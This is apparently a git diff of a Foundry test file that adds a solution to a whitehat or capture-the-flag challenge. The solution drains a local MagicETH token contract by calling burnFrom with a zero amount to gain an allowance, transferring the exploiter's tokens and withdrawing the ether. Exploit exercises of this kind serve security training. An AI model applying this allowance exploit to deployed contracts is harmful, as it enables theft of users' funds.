@@ -1,15 +1,13 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "forge-std/Test.sol";
-import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";
+import 'forge-std/Test.sol';
+import { MagicETH } from '../src/1_MagicETH/MagicETH.sol';
 
 /*////////////////////////////////////////////////////////////
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
-
-
 
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
@@ -17,13 +15,13 @@ import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";
 contract Challenge1Test is Test {
     MagicETH public mETH;
 
-    address public exploiter = makeAddr("exploiter");
-    address public whitehat = makeAddr("whitehat");
+    address public exploiter = makeAddr('exploiter');
+    address public whitehat = makeAddr('whitehat');
 
     function setUp() public {
         mETH = new MagicETH();
 
-        mETH.deposit{value: 1000 ether}();
+        mETH.deposit{ value: 1000 ether }();
         // exploiter is in control of 1000 tokens
         mETH.transfer(exploiter, 1000 ether);
     }
@@ -37,11 +35,38 @@ contract Challenge1Test is Test {
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
 
-    
+        console.log('\n  Initial balance of  whitehat:', mETH.balanceOf(whitehat) / 10e17, 'mETH');
+        console.log('Initial balance of  whitehat:', whitehat.balance / 10e17, 'ether');
+        console.log('Initial balance of exploiter:', mETH.balanceOf(exploiter) / 10e17, 'mETH');
+        console.log('Initial balance of exploiter:', exploiter.balance / 10e17, 'ether');
+        console.log('Initial balance of contract:', address(mETH).balance / 10e17, 'ether');
+
+        console.log(
+            '\n  allowance before approve:', mETH.allowance(address(whitehat), address(exploiter)) / 10e17, 'ether'
+        );
+
+        mETH.approve(address(exploiter), 1000 ether);
+
+        console.log('allowance  after approve:', mETH.allowance(address(whitehat), address(exploiter)) / 10e17, 'ether');
+
+        mETH.burnFrom(exploiter, 0);
+
+        mETH.transferFrom(exploiter, whitehat, mETH.balanceOf(exploiter));
+
+        console.log('\n  total supply:', mETH.totalSupply() / 10e17, 'ether');
+
+        mETH.withdraw(mETH.balanceOf(whitehat));
+
+        console.log('\n  After balance of  whitehat:', mETH.balanceOf(whitehat) / 10e17, 'mETH');
+        console.log('After balance of  whitehat:', whitehat.balance / 10e17, 'ether');
+        console.log('After balance of exploiter:', mETH.balanceOf(exploiter) / 10e17, 'mETH');
+        console.log('After balance of exploiter:', exploiter.balance / 10e17, 'ether');
+        console.log('After balance of contract:', address(mETH).balance / 10e17, 'ether');
+        console.log('\n  total supply:', mETH.totalSupply() / 10e17, 'ether');
 
         //==================================================//
         vm.stopPrank();
 
-        assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
+        assertEq(whitehat.balance, 1000 ether, 'whitehat should have 1000 ether');
     }
 }
